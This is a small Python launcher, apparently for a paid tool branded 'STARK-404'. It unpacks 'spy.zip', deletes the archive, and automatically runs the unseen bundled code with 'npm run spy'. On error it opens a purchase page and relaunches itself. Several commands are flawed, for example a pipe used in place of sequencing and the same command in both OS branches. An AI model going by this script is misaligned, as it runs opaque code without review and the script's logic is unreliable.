# ---------------- Imports
import os
import shutil
import pyzipper
import sys
from time import sleep
from getpass import getpass
from colorama import Fore
from rich.panel import Panel
import os

# -------------------Colors
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
y = r

# ------------------banners
logo = Panel("""

[bold white]</> [italic green] STARK-404 [bold white]</>
[bold white] </> [italic green] Github: STARK-404 [bold white]</>
[bold white] </> [italic green] instagram la1uuuuu [bold white]</>
""")

def banner():
    print(logo)

def cls_clear_func():
    os.system('cls' if os.name=='nt' else 'clear')

def exixting_directory_file(file):
    if os.path.exists(file):
        os.remove(file)

def designprint(samaywrite):
    print(logo)
    print("[bold red]"+"└─> "+'[bold white]'+"[bold green]"+samaywrite)
    print("[bold green]Please Wait Files Are Extracting ...")

def front_design():
    cls_clear_func()
    banner()

front_design()


class Setup:
    def __init__(self,user):
        self.data = user
    def mainFile(self):
        self.save = self.data
        print("Zip dosyasının şifresi:", self.save)
        try:
            with pyzipper.AESZipFile('spy.zip', 'r') as extracted_zip:  # Sadece zip dosyasını açarken şifre belirtmedik
                extracted_zip.extractall()
            designprint('Zip Dosyası Başarıyla Açıldı!')
            sleep(2.3)
            front_design()
            designprint('Dosyalar Başarıyla Çıkarıldı.')
            sleep(3.0)
            exixting_directory_file('spy.zip')
            os.system('mv main.ts Main/|npm run spy' if os.name=='nt' else 'mv main.ts Main/|npm run spy')
        except Exception as samay:
            print("Hata:", samay)
            print("[•] Dosya Açılamadı!")
            print("[•] Lütfen Tekrar Deneyin veya Admin ile İletişime Geçin.")
            print('[bold green] Mail:- gamerunknown509@gmail.com')
            print("[!] Lütfen Satın Alma Sayfasına Yönlendirildiniz!!")
            os.system("xdg-open https://www.buymeacoffee.com/mrstarkin/e/174352")
            os.system('python main.py' if os.name=='nt' else 'python3 main.py')


try:
    user_ezip_unzipping = "Şifre Yok"  # Kullanıcıdan şifre almadık, sabit bir değer atadık
except:
    pass

if __name__ == '__main__':
    exixting_directory_file('python index.py')
    main_start = Setup(user_ezip_unzipping)
    main_start.mainFile()
